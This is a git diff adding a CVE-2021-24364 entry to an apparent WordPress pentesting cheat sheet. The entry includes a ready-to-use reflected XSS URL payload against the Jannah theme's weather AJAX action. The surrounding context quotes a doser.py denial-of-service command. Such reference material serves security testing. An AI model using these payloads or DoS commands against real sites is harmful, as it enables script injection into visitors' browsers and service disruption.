@@ -6,6 +6,7 @@ Here I will try my best to mention all common security misconfigurations for Wor
 * General Scan Tool
 * xmlrpc.php
 * CVE-2018-6389
+* CVE-2021-24364
 * WP Cornjob DOS
 * WP User Enumeration
 
@@ -89,6 +90,16 @@ python3 doser.py -t 999 -g 'https://site.com/fullUrlFromLoadsxploit'
 
 [Blog Post](https://baraktawily.blogspot.com/2018/02/how-to-dos-29-of-world-wide-websites.html)
 
+# CVE-2021-24364
+The Jannah WordPress theme before 5.4.4 did not properly sanitize the options JSON parameter in its tie_get_user_weather AJAX action before outputting it back in the page, leading to a Reflected Cross-Site Scripting (XSS) vulnerability.
+
+### Detection and Exploit
+* Replace <Your_WP-Site-here> to your WP-site
+<Your_WP-Site-here>/wp-admin/admin-ajax.php?action=tie_get_user_weather&options=%7B%27location%27%3A%27Cairo%27%2C%27units%27%3A%27C%27%2C%27forecast_days%27%3A%275%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ecustom_name%27%3A%27Cairo%27%2C%27animated%27%3A%27true%27%7D
+* Wait for the pop-up!
+
+### Reference 
+[NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-24364)
 
 # WP Cornjob DOS
 This is another area where you can perform a DOS attack.
